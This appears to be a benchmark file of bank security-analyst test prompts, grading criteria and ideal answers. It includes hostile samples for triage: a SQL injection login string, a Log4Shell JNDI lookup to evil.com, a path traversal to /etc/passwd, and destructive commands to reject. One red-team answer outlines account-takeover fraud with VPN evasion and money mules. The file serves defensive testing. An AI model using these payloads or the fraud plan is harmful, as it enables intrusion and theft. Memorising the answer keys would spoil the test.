Generate PROACTIVE defensive measures to prevent the predicted attack before it materialises. This is PS#6 — recommend defences BEFORE attack occurs.

evaluation_criteria.accuracy: Must recommend Log4j patching and credential reset as top priorities
evaluation_criteria.framing: Must be framed as prevention, not response
evaluation_criteria.completeness: Must address all 5 indicators

test_cases.ideal_answer_summary: Priority 1: Emergency patch CVE-2021-44228 (Log4j) — known imminent target. Priority 2: Force reset 3 leaked credentials immediately. Priority 3: Block IPs from port scans. Priority 4: Enhanced monitoring. Priority 5: Takedown phishing kit via GitHub abuse report.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Post-Kill-Switch — attack was stopped. Generate automated RCA report for the dashboard:
{"attack": "SQL Injection", "duration_minutes": 23, "records_exposed": 4500, "MTTD_minutes": 18, "MTTR_minutes": 5, "remediation": "IP block + WAF rule", "outcome": "Stopped"}

Include: what failed, what worked, MTTD/MTTR assessment, and 3 specific improvements.

evaluation_criteria.accuracy: MTTD must be assessed as 18 min (too slow for banking), MTTR 5 min acceptable
evaluation_criteria.completeness: All required RCA sections present

test_cases.ideal_answer_summary: MTTD: 18 min (target <5 min — needs improvement). MTTR: 5 min (good). Root cause: No WAF pre-deployed, no real-time SQL injection signature detection. What worked: Kill Switch approval. 3 improvements: pre-deploy WAF, IDS SQL injection rules, automated blocking at 10 attempts.

evaluation_criteria.accuracy: Must identify the paradox: fewer vulns but more incidents = more active attackers
evaluation_criteria.completeness: Must analyse both metrics and the relationship between them
evaluation_criteria.insight: Must explain why risk score drop is misleading

test_cases.ideal_answer_summary: Mixed picture. Patching is working (4 CVEs fixed). But incident count tripled = attack activity increasing. Risk score drop from 84 to 76 is misleading — bank is under more active attack than last week. Net assessment: vulnerability posture improving but threat actor activity surging.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Nessus finding:
{"finding": "Default credentials in use", "severity": "Critical", "details": "MySQL accessible with user:root password:root", "host": "10.0.0.10", "port": 3306}

Explain why this is rated Critical and what a real attacker would do with this access.

evaluation_criteria.accuracy: Must explain complete MySQL root access implications
evaluation_criteria.completeness: Must list specific attacker actions

test_cases.ideal_answer_summary: MySQL root with default creds = complete DB control. Attacker can: dump all 50K customer records, delete all data, add backdoor users, read config files with other credentials, pivot to other systems. Change password immediately — this is a critical emergency.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Anomaly detected:
{"event": "Same customer account logged in from India, Russia, and Nigeria within 90 minutes", "account_type": "premium_customer", "actions": ["viewed balance", "initiated $3000 transfer", "changed security questions"]}

Predict what is happening and what will happen next if not stopped.

evaluation_criteria.accuracy: Must identify impossible travel = account takeover
evaluation_criteria.prediction: Must predict transfer will complete and additional fraud will follow

test_cases.ideal_answer_summary: Impossible travel = account takeover via credential theft or SIM swap. $3000 transfer = first fraud attempt. Security question change = locking out real customer. Prediction: transfer completes, account locked out, more fraud follows. Immediate: freeze account and reverse pending transfer.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Authentication configuration audit:
{"password_min_length": 6, "complexity": false, "expiry": "never", "mfa": false, "session_timeout_hours": 8, "failed_login_lockout": false, "password_history": false}

This is a banking application. Generate hardened authentication configuration meeting PCI-DSS and NIST SP 800-63B standards.

evaluation_criteria.accuracy: Must recommend MFA as mandatory for banking
evaluation_criteria.completeness: Must address all 7 configuration items
evaluation_criteria.standards: Must reference PCI-DSS and/or NIST SP 800-63B

test_cases.ideal_answer_summary: Min 12 chars + complexity (upper, lower, number, symbol). Mandatory MFA (TOTP or hardware key). Session timeout 15 minutes. Lockout after 5 attempts (30 min). Password history 12. PCI-DSS requirement 8.3. Expiry: 90 days.

evaluation_criteria.accuracy: Must rank DB connection string with root credentials as most critical
evaluation_criteria.completeness: Must explain attacker value of each finding

test_cases.ideal_answer_summary: 1. DB comment (Critical) — tells attacker DB IP, port, name, and root username. 2. Stack trace (High) — reveals code structure and exact file paths for targeted attacks. 3. Apache 2.2.34 (High) — maps to specific CVEs. 4. Internal IP (Medium) — confirms internal topology.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Security controls assessment against NIST Cybersecurity Framework:
{"has_firewall": true, "has_IDS": false, "has_WAF": false, "has_SIEM": false, "has_MFA": false, "has_DLP": false, "has_EDR": false, "has_patch_management": true, "has_backup": true, "security_training": false}

Map each control to NIST CSF functions and identify the biggest gaps.

evaluation_criteria.accuracy: Must correctly map controls to NIST CSF 5 functions
evaluation_criteria.completeness: Must assess all 10 controls
evaluation_criteria.framework: Must structure analysis using NIST CSF

test_cases.ideal_answer_summary: Identify: OK (firewall, patch mgmt). Protect: critical gaps (no MFA, WAF, DLP). Detect: completely missing (no IDS, no SIEM, no EDR). Respond: no SIEM = no detection = no response possible. Recover: OK (backup). Biggest gap: Detect function entirely absent.

evaluation_criteria.accuracy: Must correlate TOR listing with open ports for full risk picture
evaluation_criteria.completeness: Must flag Telnet 23 and FTP 21 as legacy/critical
evaluation_criteria.correlation: Must demonstrate combined risk from both tools

test_cases.ideal_answer_summary: TOR exit node listing on 10.0.0.5 = bank IP on attackers' lists. FTP anonymous = data exfiltration path. Telnet 23 = unencrypted protocol. MySQL 3306 on app-server = should be internal only. Combined posture: Critical. Immediate closure of 21, 23, 3306 required.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank. Write a formal root cause analysis report for the following confirmed breach.

Incident: Customer database of 45,000 records exfiltrated over 3 days.
Timeline reconstruction:
- Day 1 10:00: SpiderFoot alert — 3 staff credentials found on dark web (no action taken)
- Day 1 14:00: Attacker VPN login with stolen credentials from Russia
- Day 2 09:00: Internal nmap scan run by attacker on subnet
- Day 3 02:00: Log4Shell CVE-2021-44228 exploited on internal server
- Day 5 08:00: DB dump started — 200 records/min exfiltrated via DNS tunnelling
- Day 8 09:00: Customer fraud alerts — investigation started

Write complete RCA with executive summary, timeline, root causes, contributing factors, and 5 lessons learned.

evaluation_criteria.accuracy: Primary root cause = dark web alert ignored. Contributing = Log4j unpatched, no internal anomaly detection
evaluation_criteria.completeness: Must include all 5 required report sections

test_cases.ideal_answer_summary: Executive: 8-day breach, 45K records. Primary root cause: dark web alert not actioned. Contributing: Log4j unpatched, VPN no geo-restriction, no internal scanning detection, DNS exfil undetected. 5 lessons: auto-reset on dark web hits, VPN geo-block, internal anomaly detection, patch management SLA, DNS monitoring.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Active incident — data exfiltration in progress RIGHT NOW:
{"status": "active", "method": "SQL injection", "rate": "300 records/minute", "duration": "8 minutes so far", "total_exfiltrated": 2400, "target_table": "customers", "attacker_ip": "45.220.11.8"}

2,400 records already gone. Every minute = 300 more. Generate emergency response with time urgency.

evaluation_criteria.accuracy: Must stop DB connection as first priority to stop ongoing leak
evaluation_criteria.urgency: Must reflect that every second = more records stolen
evaluation_criteria.completeness: Containment + evidence + notification all covered

test_cases.ideal_answer_summary: IMMEDIATE: Kill attacker DB connection. Block IP 45.220.11.8. WAF rule for SQL injection. Every 60 seconds = 300 more records. At 8 minutes already 2,400 stolen. Forensic: don't restart services — preserve connection logs. GDPR clock started when attack started.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

ZAP finding:
{"alert": "Directory Traversal", "risk": "High", "url": "/download?file=../../../etc/passwd", "evidence": "root:x:0:0:root:/root:/bin/bash"}

Explain what information was exposed and what an attacker can do next.

evaluation_criteria.accuracy: Must explain what /etc/passwd reveals and what other files could be accessed
evaluation_criteria.completeness: Must list escalation paths beyond /etc/passwd
evaluation_criteria.banking_context: Must relate to banking system file exposure

test_cases.ideal_answer_summary: Directory traversal exposed user list via /etc/passwd. Attacker can next access: /etc/shadow (hashed passwords), SSH private keys, web server config with DB credentials, application config files. Full server compromise possible via credential extraction.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Kill Switch was just approved and deployed:
{"action_taken": "Blocked IP 185.220.101.45 + Enabled WAF SQL injection rule #442"}

Generate post-remediation verification checklist and confirmation report for the dashboard. Include what to check to confirm attack has stopped.

evaluation_criteria.accuracy: Must provide concrete, verifiable steps
evaluation_criteria.completeness: Technical verification + business confirmation
evaluation_criteria.format: Clear checklist format suitable for dashboard display

test_cases.ideal_answer_summary: Verify: 1) Zero requests from 185.220.101.45 in last 5 min. 2) WAF rule 442 active and blocking. 3) /login responding normally. 4) No new DB anomalies. 5) Create incident ticket INC-XXX. 6) 24-hour enhanced monitoring window. 7) Schedule post-incident review.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Red team exercise results:
{"attacks_attempted": 15, "attacks_succeeded": 9, "detected": 4, "blocked": 2, "undetected_success": 5, "MTTD_avg_minutes": 52, "MTTR_avg_minutes": 210}

Generate defence gap analysis report with security maturity rating.

evaluation_criteria.accuracy: Must calculate correct success/detection rates
evaluation_criteria.completeness: Detection and response gaps both assessed
evaluation_criteria.maturity: Must assign security maturity level with justification

test_cases.ideal_answer_summary: 60% attack success rate = critical. Only 27% detection rate. MTTD 52min and MTTR 3.5hrs both unacceptable for banking. 5 attacks succeeded undetected. Maturity: Level 1 (Initial). Roadmap: SIEM deployment, automated response, SOC capability building.

evaluation_criteria.accuracy: Must flag as suspicious — first ever transfer, $9,800, at 2AM = account takeover indicator
evaluation_criteria.reasoning: Must note deviation from zero-transfer historical baseline

test_cases.ideal_answer_summary: suspicious: true, confidence: 0.95, reason: first ever transfer of $9800 at 2AM outside normal hours = account takeover indicator, escalate: true

test_cases.prompt:
You are a real-time dashboard event classifier. Classify this entire batch of log entries for WebSocket streaming. Respond JSON array only.

Logs:
1. "2026-03-14 22:00 GET /robots.txt 200 from 45.33.22.11"
2. "2026-03-14 22:01 POST /login username=admin' OR '1'='1-- 500"
3. "2026-03-14 22:01 GET /account?id=2001 user=cust_100 200" (cust_100 owns account 1001 not 2001)
4. "2026-03-14 22:02 RuntimeException: ${jndi:ldap://evil.com/x} in User-Agent"
5. "2026-03-14 22:02 GET /index.html 200 from 10.0.0.1"

For each: {"id": int, "threat": str, "severity": str, "color": str, "escalate": bool}

evaluation_criteria.accuracy: 1=recon/low/yellow/false, 2=SQLi/critical/red/true, 3=IDOR/high/orange/true, 4=Log4Shell/critical/red/true, 5=normal/none/green/false
evaluation_criteria.completeness: All 5 classified correctly

test_cases.ideal_answer_summary: 1:recon/low/yellow/false. 2:SQL injection/critical/red/true. 3:IDOR/high/orange/true. 4:Log4Shell/critical/red/true. 5:normal/none/green/false.

evaluation_criteria.accuracy: Must connect rogue Pi + CSRF + dark web credentials = automated fund theft operation
evaluation_criteria.prediction: Must predict continued escalating theft if not stopped

test_cases.ideal_answer_summary: Rogue Pi using stolen credentials + CSRF to automate $500 transfers. Rate: $1,000/min. Next 10 min: additional $10,000 loss. Predicted total if not stopped: $50,000+. STOP: Isolate 10.0.0.99 + disable /api/transfer + invalidate all sessions NOW.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Nessus found these three weaponised CVEs:
[
  {"cve": "CVE-2017-0144", "name": "EternalBlue", "host": "10.0.0.5", "port": 445},
  {"cve": "CVE-2020-1472", "name": "Zerologon", "host": "10.0.0.2", "service": "Netlogon"},
  {"cve": "CVE-2021-26855", "name": "ProxyLogon", "host": "10.0.0.15", "service": "Exchange"}
]

All have public exploits. Prioritise and explain the blast radius of each for a banking environment.

evaluation_criteria.accuracy: Must prioritise Zerologon first (instant domain admin = full network)
evaluation_criteria.completeness: Blast radius explained for all 3
evaluation_criteria.banking_context: Must relate each to banking-specific impact

test_cases.ideal_answer_summary: Priority 1: Zerologon (instant domain admin = complete network compromise). Priority 2: EternalBlue (wormable, WannaCry-style lateral spread). Priority 3: ProxyLogon (Exchange compromise = email access, potential BEC). All require emergency patching TODAY.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Log4Shell emergency — CVE-2021-44228 detected on production server:
{"cve": "CVE-2021-44228", "cvss": 10.0, "host": "10.0.0.25", "service": "Elasticsearch", "publicly_exploited": true, "exploit_in_wild": true, "jndi_attempt_detected": true}

Active exploitation attempt detected. Generate emergency Log4Shell Kill Switch playbook.

evaluation_criteria.accuracy: Must include correct Log4Shell mitigation (formatMsgNoLookups=true or upgrade to 2.17)
evaluation_criteria.completeness: Immediate workaround + permanent fix + network controls
evaluation_criteria.urgency: CVSS 10 with active exploitation = maximum urgency

test_cases.ideal_answer_summary: Immediate: Set log4j2.formatMsgNoLookups=true. Block outbound LDAP/RMI at firewall. WAF rule blocking ${jndi: pattern. Permanent: Upgrade to Log4j 2.17.1+. Scan ALL systems for Log4j usage. 24hr deadline. CVSS 10.0 — no exceptions.

evaluation_criteria.accuracy: Must flag RDP 3389 and MongoDB 27017 as highest risk
evaluation_criteria.completeness: All 7 dangerous ports addressed
evaluation_criteria.prioritisation: Correct priority order with attack justification per port

test_cases.ideal_answer_summary: Priority 1: RDP 3389 (ransomware entry point). Priority 2: MongoDB 27017 (often unauthenticated by default). Priority 3: MySQL 3306 (internal only). Priority 4: PostgreSQL 5432 (internal only). Priority 5: SSH 22 (restrict to management IPs). Close or restrict all.

evaluation_criteria.accuracy: Must classify as emergency — CVSS 10.0 with public exploit = maximum urgency
evaluation_criteria.format: Valid JSON with all 5 fields including urgency

test_cases.ideal_answer_summary: suspicious: true, confidence: 1.0, reason: CVSS 10.0 Log4Shell with public exploit = maximum severity, escalate: true, urgency: emergency

evaluation_criteria.accuracy: Score must jump significantly — CVSS 10.0 on production web server should push to critical
evaluation_criteria.threshold: alert_level must be critical given CVSS 10.0

test_cases.ideal_answer_summary: new_score: 85-95, delta: +40-50, reason: CVSS 10.0 Log4Shell on web server = maximum severity vulnerability, alert_level: critical

test_cases.prompt:
You are a security playbook safety verifier for a production banking server. Assess this remediation batch and flag any dangerous commands. Respond JSON array.

Commands:
1. "systemctl restart apache2"
2. "DROP TABLE customers"
3. "fail2ban-client set sshd banip 185.220.101.45"
4. "chmod 777 /var/www/html/"
5. "ufw deny from 185.220.101.45 to any"

For each: {"cmd_id": int, "safe": bool, "risk": str, "concern": str or null, "approved": bool}

evaluation_criteria.accuracy: Must reject: 2 (DROP TABLE = data loss), 4 (chmod 777 = world-writable security hole)
evaluation_criteria.completeness: All 5 assessed
evaluation_criteria.reasoning: Must clearly explain why dangerous commands are rejected

test_cases.ideal_answer_summary: 1: approved (safe restart). 2: NOT APPROVED — destroys customer database. 3: approved (targeted IP ban). 4: NOT APPROVED — world-writable web directory = major security hole. 5: approved (targeted IP block).

evaluation_criteria.accuracy: Must model realistic account takeover with daily limits
evaluation_criteria.completeness: Full attack from credential purchase to max fund extraction
evaluation_criteria.evasion: Must include VPN/proxy use to evade geo-detection

test_cases.ideal_answer_summary: Day 1: Purchase creds from dark web. Use VPN near victim's city. Login, change contact info. Transfer $10K (daily limit). Day 2-3: Transfer $10K/day to money mule. Blue team opportunity: new login device fingerprint, contact info change, unusual transfer pattern. Total extracted: $30K over 3 days before detection.

evaluation_criteria.accuracy: Must identify whaling/BEC attack targeting CFO for fraudulent wire transfer
evaluation_criteria.completeness: Must flag shadow IT subdomain and expired cert as additional risks
evaluation_criteria.intelligence: Must connect spear phish attempt + DNS lookup as coordinated campaign

test_cases.ideal_answer_summary: Business Email Compromise (whaling) targeting CFO for fraudulent wire transfer. Evidence: spear phish attempt + DNS lookup of admin subdomain = reconnaissance. Shadow IT subdomain = unknown attack surface. Expired SSL on api = MitM risk. Coordinated targeted campaign.

evaluation_criteria.accuracy: Must explain XXE in banking transaction XML context + Confluence CVE combination
evaluation_criteria.completeness: Must explain how vulnerabilities chain
evaluation_criteria.technical: Must demonstrate understanding of XXE → SSRF → Confluence exploitation chain

test_cases.ideal_answer_summary: XXE on /api/transfer allows file disclosure and SSRF attacks via transaction XML. Combined with CVE-2019-3396: SSRF from XXE reaches Confluence server, exploits Confluence CVE for RCE. Full internal network access via a legitimate-looking transaction request.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Full system hardening audit:
{"tls": "TLS 1.0 and 1.1 enabled, TLS 1.2 optional", "ciphers": ["RC4", "DES", "3DES", "AES-128"], "cert": "SHA-1 signed, expires in 12 days", "ssh": "password auth enabled, root login permitted", "mysql": "runs as root, remote root login enabled", "php": "version 5.6 EOL", "apache": "version 2.2 EOL, mod_status exposed at /server-status"}

Generate complete configuration hardening guide with specific commands for each finding.

evaluation_criteria.accuracy: Correct values for each configuration
evaluation_criteria.completeness: All 7 findings addressed
evaluation_criteria.commands: Must include actual config commands or file references

test_cases.ideal_answer_summary: SSL: TLS 1.2/1.3 only, disable RC4/DES/3DES, renew cert with SHA-256 URGENT (12 days). SSH: PermitRootLogin no, PasswordAuthentication no (keys only). MySQL: create non-root user, disable remote root. PHP: upgrade to 8.2+. Apache: upgrade to 2.4, disable mod_status.

evaluation_criteria.accuracy: Must identify WordPress 4.9 as outdated with known CVEs
evaluation_criteria.completeness: Must assess all 3 OSINT findings for attack surface value
evaluation_criteria.insight: Must explain wildcard cert risk — if compromised affects all subdomains

test_cases.ideal_answer_summary: 38 emails = large social engineering surface for phishing. WordPress 4.9 = multiple known CVEs (EOL version). Wildcard cert: if private key compromised, attacker can impersonate any *.altoro.com subdomain. Attack surface rating: High.

test_cases.prompt:
You are a senior cybersecurity analyst for a bank.

Post-incident analysis — Kill Switch was deployed successfully. Now assess what systemic gaps allowed the attack to occur in the first place:
{"attack_succeeded_for_minutes": 23, "detection_method": "customer complaint", "controls_that_failed": ["no WAF", "no IDS", "no real-time monitoring"], "controls_that_worked": ["Kill Switch once activated", "firewall IP block"], "data_exposed": 4500}

Generate a systemic gap analysis and 90-day improvement roadmap.

evaluation_criteria.accuracy: Must identify detection via customer complaint (not automated) as primary gap
evaluation_criteria.completeness: All failed controls addressed + 90-day roadmap with monthly milestones
evaluation_criteria.roadmap: 90-day roadmap must be specific and executable

test_cases.ideal_answer_summary: Primary gap: no automated detection — discovered via customer complaint after 23 minutes. Month 1: Deploy WAF + IDS signatures. Month 2: SIEM + automated alerting. Month 3: Threat hunting capability + purple team exercise. Target: MTTD <5 minutes.
